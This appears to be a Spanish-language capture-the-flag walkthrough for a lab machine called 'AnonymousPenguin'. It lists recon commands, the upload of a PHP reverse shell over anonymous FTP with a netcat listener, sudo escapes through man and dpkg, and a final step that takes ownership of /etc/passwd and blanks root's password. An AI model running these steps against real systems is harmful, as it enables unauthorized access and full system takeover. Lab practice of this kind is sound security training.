Maquina: AnonymousPenguin

Autor: El Pinguino de Mario

Dificultad: Facil

ping 172.17.0.2 -c 1

nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2

Vemos que esta abierto el puerto 21 FTP y el puerto 80 HTTP

Si accedemos a la pagina web vemos esto

Usamos Gobuster para hacer un reconocimiento web y ver que directorios podemos encontrar

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

Vemos que hay un directorio upload pero no hay nada dentro vamos a intentar subir desde el ftp una reverse shell a la carpeta upload y asi conseguir acceso

Hemos podido subir el archivo de la reverse shell php

ftp 172.17.0.2

Accedemos como anonymous

En el directorio web también aparace upload

En este directorio vamos a subir un php reverse shell

Nos ponemos en escucha con Netcat

nc -lvnp 443

sudo -l 

vemos que podemos ejecutar man como Pingu

sudo -u pingu /usr/bin/man man

!/bin/sh
whoami

sudo -l 

vemos que podemos ejecutar nmap y dpkg como el usuario gladys

sudo -u gladys /usr/bin/dpkg -l

!/bin/sh
whoami

sudo -l 
vemos que podemos ejecutar chown como root

cambiamos el propietario de /etc/passwd

sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd

Con sed hacemos que elimine la X que tiene root para que la contraseña desaparezca y creamos un archivo temporal en tmp

sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp

copiamos el tmp donde esta el original para que lo sobreescriba

cp /tmp/passwd.tmp /etc/passwd

su root

whoami



